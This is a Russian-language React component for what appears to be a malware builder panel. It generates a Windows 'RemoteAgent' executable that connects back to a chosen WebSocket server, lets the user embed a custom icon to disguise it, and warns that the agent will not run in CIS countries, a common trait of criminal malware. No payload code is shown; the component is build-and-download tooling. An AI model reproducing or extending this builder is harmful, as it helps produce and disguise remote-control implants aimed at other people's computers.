'use client';

import React, { useState, useCallback, useEffect, useRef, useMemo } from 'react';

interface BuildConfig {
  serverUrl: string;
  clientName: string;
  targetOS: 'win';
}

function fileToBase64(file: File): Promise<string> {
  return new Promise((resolve, reject) => {
    const reader = new FileReader();
    reader.onload = () => resolve((reader.result as string).split(',')[1]);
    reader.onerror = reject;
    reader.readAsDataURL(file);
  });
}

interface BuiltFile {
  name: string;
  size: number;
  createdAt: string;
  path: string;
}

type BuildStatus = 'idle' | 'building' | 'success' | 'error';

export default function ClientBuilder() {
  const getAutoServerUrl = useCallback(() => {
    if (process.env.NEXT_PUBLIC_WS_URL) return process.env.NEXT_PUBLIC_WS_URL;
    if (typeof window === 'undefined') return 'ws://localhost:3001';
    const wsProtocol = window.location.protocol === 'https:' ? 'wss' : 'ws';
    return `${wsProtocol}://${window.location.hostname}:3001`;
  }, []);

  const defaultServerUrl = useMemo(() => getAutoServerUrl(), [getAutoServerUrl]);

  const [config, setConfig] = useState<BuildConfig>({
    serverUrl: defaultServerUrl,
    clientName: 'RemoteAgent',
    targetOS: 'win',
  });
  const [status, setStatus] = useState<BuildStatus>('idle');
  const [progress, setProgress] = useState(0);
  const [error, setError] = useState('');
  const [builtFiles, setBuiltFiles] = useState<BuiltFile[]>([]);
  const [buildLog, setBuildLog] = useState<string[]>([]);
  const progressTimer = useRef<ReturnType<typeof setInterval> | null>(null);
  const [iconFile, setIconFile] = useState<File | null>(null);
  const [iconPreview, setIconPreview] = useState<string | null>(null);
  const iconInputRef = useRef<HTMLInputElement>(null);

  const handleIconSelect = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (!file) return;
    if (!file.name.match(/\.(png|ico)$/i)) {
      setError('Поддерживаются только PNG и ICO файлы');
      return;
    }
    if (file.size > 5 * 1024 * 1024) {
      setError('Файл иконки не должен превышать 5 МБ');
      return;
    }
    setIconFile(file);
    setError('');
    const url = URL.createObjectURL(file);
    setIconPreview(url);
  };

  const clearIcon = () => {
    setIconFile(null);
    if (iconPreview) URL.revokeObjectURL(iconPreview);
    setIconPreview(null);
    if (iconInputRef.current) iconInputRef.current.value = '';
  };

  // Load existing builds
  useEffect(() => {
    fetchBuiltFiles();
  }, []);

  const fetchBuiltFiles = async () => {
    try {
      const res = await fetch('/api/build-client');
      if (res.ok) {
        const data = await res.json();
        setBuiltFiles(data.files || []);
      }
    } catch {
      /* ignore */
    }
  };

  const addLog = useCallback((msg: string) => {
    setBuildLog((prev) => [...prev, `[${new Date().toLocaleTimeString()}] ${msg}`]);
  }, []);

  const startBuild = async () => {
    // Validate
    if (!config.serverUrl.match(/^wss?:\/\/.+/)) {
      setError('Введите корректный WebSocket URL (ws:// или wss://)');
      return;
    }
    if (!config.clientName.trim()) {
      setError('Введите имя клиента');
      return;
    }

    setStatus('building');
    setError('');
    setProgress(0);
    setBuildLog([]);

    addLog('Инициализация сборки...');
    addLog(`Сервер: ${config.serverUrl}`);
    addLog(`Имя клиента: ${config.clientName}`);
    addLog(`Платформа: Windows`);

    // Fake progress while building
    let p = 0;
    progressTimer.current = setInterval(() => {
      p += Math.random() * 8 + 2;
      if (p > 90) p = 90;
      setProgress(Math.round(p));
    }, 600);

    addLog('Генерация исходного кода клиента...');
    if (iconFile) {
      addLog(`Иконка: ${iconFile.name} (${(iconFile.size / 1024).toFixed(1)} KB)`);
    }

    try {
      let iconBase64: string | undefined;
      let iconFileName: string | undefined;
      if (iconFile) {
        iconBase64 = await fileToBase64(iconFile);
        iconFileName = iconFile.name;
      }

      const res = await fetch('/api/build-client', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          ...config,
          ...(iconBase64 ? { iconBase64, iconFileName } : {}),
        }),
      });

      if (progressTimer.current) clearInterval(progressTimer.current);

      if (!res.ok) {
        const errData = await res.json().catch(() => ({ error: 'Unknown error' }));
        throw new Error(errData.details || errData.error || `HTTP ${res.status}`);
      }

      setProgress(95);
      addLog('Компиляция завершена. Подготовка файла...');

      // Download the file
      const blob = await res.blob();
      const fileName = res.headers.get('X-File-Name') || `${config.clientName}.exe`;
      const url = URL.createObjectURL(blob);
      const a = document.createElement('a');
      a.href = url;
      a.download = fileName;
      document.body.appendChild(a);
      a.click();
      document.body.removeChild(a);
      URL.revokeObjectURL(url);

      setProgress(100);
      setStatus('success');
      addLog(`✅ Сборка завершена: ${fileName} (${formatBytes(blob.size)})`);
      addLog(`Файл сохранён в папку downloads/`);

      // Refresh file list
      fetchBuiltFiles();
    } catch (err: unknown) {
      if (progressTimer.current) clearInterval(progressTimer.current);
      const msg = err instanceof Error ? err.message : 'Неизвестная ошибка';
      setError(msg);
      setStatus('error');
      addLog(`❌ Ошибка: ${msg}`);
    }
  };

  const formatBytes = (bytes: number) => {
    if (bytes < 1024) return bytes + ' B';
    if (bytes < 1024 * 1024) return (bytes / 1024).toFixed(1) + ' KB';
    return (bytes / (1024 * 1024)).toFixed(1) + ' MB';
  };

  const formatDate = (iso: string) => {
    return new Date(iso).toLocaleString('ru-RU', {
      day: '2-digit',
      month: '2-digit',
      year: 'numeric',
      hour: '2-digit',
      minute: '2-digit',
    });
  };

  return (
    <div className="space-y-6 animate-fade-in">
      {/* Config Card */}
      <div className="bg-zinc-900 border border-zinc-800 rounded-xl p-6">
        <div className="flex items-center gap-3 mb-6">
          <div className="w-10 h-10 bg-emerald-500/10 rounded-lg flex items-center justify-center">
            <svg className="w-5 h-5 text-emerald-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={1.5} d="M10.325 4.317c.426-1.756 2.924-1.756 3.35 0a1.724 1.724 0 002.573 1.066c1.543-.94 3.31.826 2.37 2.37a1.724 1.724 0 001.066 2.573c1.756.426 1.756 2.924 0 3.35a1.724 1.724 0 00-1.066 2.573c.94 1.543-.826 3.31-2.37 2.37a1.724 1.724 0 00-2.573 1.066c-.426 1.756-2.924 1.756-3.35 0a1.724 1.724 0 00-2.573-1.066c-1.543.94-3.31-.826-2.37-2.37a1.724 1.724 0 00-1.066-2.573c-1.756-.426-1.756-2.924 0-3.35a1.724 1.724 0 001.066-2.573c-.94-1.543.826-3.31 2.37-2.37.996.608 2.296.07 2.572-1.065z" />
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={1.5} d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
            </svg>
          </div>
          <div>
            <h3 className="text-white font-semibold">Конфигурация клиента</h3>
            <p className="text-sm text-zinc-500">Настройте параметры генерируемого агента</p>
          </div>
        </div>

        <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
          {/* Server URL */}
          <div className="col-span-full">
            <label className="block text-sm text-zinc-400 mb-1.5">Адрес WebSocket сервера</label>
            <div className="relative">
              <span className="absolute left-3 top-1/2 -translate-y-1/2 text-zinc-600 text-sm">🌐</span>
              <input
                type="text"
                value={config.serverUrl}
                onChange={(e) => setConfig({ ...config, serverUrl: e.target.value })}
                placeholder="ws://your-server:3001"
                className="w-full bg-zinc-800 border border-zinc-700 rounded-lg pl-9 pr-4 py-2.5 text-sm text-white placeholder-zinc-600 focus:outline-none focus:ring-2 focus:ring-emerald-500/50 focus:border-emerald-500/50 transition-all font-mono"
                disabled={status === 'building'}
              />
              <button
                type="button"
                onClick={() => setConfig((prev) => ({ ...prev, serverUrl: getAutoServerUrl() }))}
                disabled={status === 'building'}
                className="absolute right-1.5 top-1/2 -translate-y-1/2 px-3 py-1.5 rounded-md text-xs font-medium bg-zinc-700 hover:bg-zinc-600 text-zinc-200 border border-zinc-600 disabled:opacity-50 disabled:cursor-not-allowed"
              >
                Авто
              </button>
            </div>
            <p className="text-xs text-zinc-600 mt-1">Адрес, к которому агент будет подключаться при запуске</p>
          </div>

          {/* Client Name */}
          <div>
            <label className="block text-sm text-zinc-400 mb-1.5">Имя клиента</label>
            <input
              type="text"
              value={config.clientName}
              onChange={(e) => setConfig({ ...config, clientName: e.target.value.replace(/[^a-zA-Z0-9_-]/g, '') })}
              placeholder="RemoteAgent"
              maxLength={32}
              className="w-full bg-zinc-800 border border-zinc-700 rounded-lg px-4 py-2.5 text-sm text-white placeholder-zinc-600 focus:outline-none focus:ring-2 focus:ring-emerald-500/50 focus:border-emerald-500/50 transition-all"
              disabled={status === 'building'}
            />
            <p className="text-xs text-zinc-600 mt-1">Латиница, цифры, дефис, подчёркивание</p>
          </div>

          {/* CIS Warning */}
          <div className="col-span-full flex items-start gap-2.5 rounded-lg border border-yellow-500/30 bg-yellow-500/10 px-4 py-3">
            <svg className="w-5 h-5 text-yellow-400 flex-shrink-0 mt-0.5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 9v2m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
            </svg>
            <div>
              <span className="text-sm font-medium text-yellow-400">Страны СНГ не поддерживаются</span>
              <p className="text-xs text-yellow-500/70 mt-0.5">Агент не будет работать в странах СНГ</p>
            </div>
          </div>

          {/* Custom Icon */}
          <div className="col-span-full">
            <label className="block text-sm text-zinc-400 mb-1.5">Иконка клиента (необязательно)</label>
            <div className="flex items-center gap-3">
              <input
                ref={iconInputRef}
                type="file"
                accept=".png,.ico"
                onChange={handleIconSelect}
                className="hidden"
                disabled={status === 'building'}
              />
              <button
                type="button"
                onClick={() => iconInputRef.current?.click()}
                disabled={status === 'building'}
                className="flex items-center gap-2 px-4 py-2.5 bg-zinc-800 border border-zinc-700 rounded-lg text-sm text-zinc-300 hover:border-zinc-600 hover:text-white transition-all disabled:opacity-50 disabled:cursor-not-allowed"
              >
                <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={1.5} d="M4 16l4.586-4.586a2 2 0 012.828 0L16 16m-2-2l1.586-1.586a2 2 0 012.828 0L20 14m-6-6h.01M6 20h12a2 2 0 002-2V6a2 2 0 00-2-2H6a2 2 0 00-2 2v12a2 2 0 002 2z" />
                </svg>
                {iconFile ? 'Изменить иконку' : 'Выбрать иконку'}
              </button>
              {iconFile && (
                <div className="flex items-center gap-2 animate-fade-in">
                  {iconPreview && (
                    <img src={iconPreview} alt="Icon preview" className="w-8 h-8 rounded border border-zinc-700 object-contain bg-zinc-800" />
                  )}
                  <span className="text-xs text-zinc-400">{iconFile.name}</span>
                  <button
                    type="button"
                    onClick={clearIcon}
                    disabled={status === 'building'}
                    className="w-5 h-5 flex items-center justify-center rounded bg-zinc-800 hover:bg-red-500/20 text-zinc-500 hover:text-red-400 transition-all"
                  >
                    <svg className="w-3 h-3" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
                    </svg>
                  </button>
                </div>
              )}
            </div>
            <p className="text-xs text-zinc-600 mt-1">PNG или ICO. Будет встроена в .exe (только Windows)</p>
          </div>

          {/* Target OS - Windows only */}
          <div>
            <label className="block text-sm text-zinc-400 mb-1.5">Целевая платформа</label>
            <div className="flex gap-2">
              <div className="flex-1 flex items-center justify-center gap-2 px-3 py-2.5 rounded-lg border bg-emerald-500/10 border-emerald-500/50 text-emerald-400 text-sm">
                <svg className="w-4 h-4" viewBox="0 0 24 24" fill="currentColor">
                  <path d="M0 3.449L9.75 2.1v9.451H0m10.949-9.602L24 0v11.4H10.949M0 12.6h9.75v9.451L0 20.699M10.949 12.6H24V24l-12.9-1.801"/>
                </svg>
                <span>Windows</span>
              </div>
            </div>
          </div>
        </div>

        {/* Error */}
        {error && (
          <div className="mt-4 p-3 bg-red-500/10 border border-red-500/20 rounded-lg">
            <p className="text-sm text-red-400">{error}</p>
          </div>
        )}

        {/* Build Button */}
        <div className="mt-6 flex items-center gap-4">
          <button
            onClick={startBuild}
            disabled={status === 'building'}
            className={`flex items-center gap-2 px-6 py-2.5 rounded-lg text-sm font-medium transition-all ${
              status === 'building'
                ? 'bg-zinc-700 text-zinc-400 cursor-not-allowed'
                : 'bg-emerald-600 hover:bg-emerald-500 text-white active:scale-[0.97]'
            }`}
          >
            {status === 'building' ? (
              <>
                <svg className="w-4 h-4 animate-spin" viewBox="0 0 24 24" fill="none">
                  <circle cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="3" strokeDasharray="31.4 31.4" strokeLinecap="round" />
                </svg>
                Сборка...
              </>
            ) : (
              <>
                <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 14l-7 7m0 0l-7-7m7 7V3" />
                </svg>
                Собрать клиент
              </>
            )}
          </button>

          {status === 'success' && (
            <div className="flex items-center gap-1.5 text-sm text-emerald-400 animate-fade-in">
              <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
              </svg>
              Сборка завершена успешно
            </div>
          )}
        </div>

        {/* Progress Bar */}
        {(status === 'building' || status === 'success') && (
          <div className="mt-4">
            <div className="flex items-center justify-between text-xs text-zinc-500 mb-1.5">
              <span>
                {progress < 30
                  ? 'Генерация клиента...'
                  : progress < 70
                  ? 'Компиляция Node.js → exe...'
                  : progress < 95
                  ? 'Упаковка и сжатие...'
                  : 'Готово!'}
              </span>
              <span>{progress}%</span>
            </div>
            <div className="w-full h-2 bg-zinc-800 rounded-full overflow-hidden">
              <div
                className={`h-full rounded-full transition-all duration-500 ease-out ${
                  status === 'success' ? 'bg-emerald-500' : 'bg-emerald-500/80'
                }`}
                style={{ width: `${progress}%` }}
              />
            </div>
          </div>
        )}
      </div>

      {/* Build Log */}
      {buildLog.length > 0 && (
        <div className="bg-zinc-900 border border-zinc-800 rounded-xl p-6 animate-fade-in">
          <div className="flex items-center gap-2 mb-3">
            <svg className="w-4 h-4 text-zinc-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={1.5} d="M8 9l3 3-3 3m5 0h3M5 20h14a2 2 0 002-2V6a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z" />
            </svg>
            <h4 className="text-sm font-medium text-zinc-400">Журнал сборки</h4>
          </div>
          <div className="bg-zinc-950 rounded-lg p-3 font-mono text-xs max-h-48 overflow-y-auto custom-scrollbar">
            {buildLog.map((line, i) => (
              <div key={i} className={`py-0.5 ${line.includes('❌') ? 'text-red-400' : line.includes('✅') ? 'text-emerald-400' : 'text-zinc-400'}`}>
                {line}
              </div>
            ))}
          </div>
        </div>
      )}

      {/* Previous builds */}
      <div className="bg-zinc-900 border border-zinc-800 rounded-xl p-5">
        <div className="flex items-center gap-3 mb-3">
          <div className="w-8 h-8 bg-purple-500/10 rounded-lg flex items-center justify-center">
            <svg className="w-4 h-4 text-purple-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={1.5} d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4" />
            </svg>
          </div>
          <h4 className="text-sm font-medium text-white">Предыдущие сборки</h4>
        </div>
        {builtFiles.length === 0 ? (
          <p className="text-xs text-zinc-600">Нет сохранённых сборок</p>
        ) : (
          <div className="space-y-2 max-h-48 overflow-y-auto custom-scrollbar">
            {builtFiles.map((file) => (
              <div
                key={file.name}
                className="flex items-center justify-between p-2 bg-zinc-800/50 rounded-lg"
              >
                <div className="min-w-0 flex-1">
                  <div className="text-xs text-zinc-300 truncate">{file.name}</div>
                  <div className="text-[10px] text-zinc-600">
                    {formatBytes(file.size)} · {formatDate(file.createdAt)}
                  </div>
                </div>
                <div className="w-5 h-5 bg-emerald-500/10 rounded flex items-center justify-center flex-shrink-0 ml-2">
                  <svg className="w-3 h-3 text-emerald-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
                  </svg>
                </div>
              </div>
            ))}
          </div>
        )}
      </div>
    </div>
  );
}
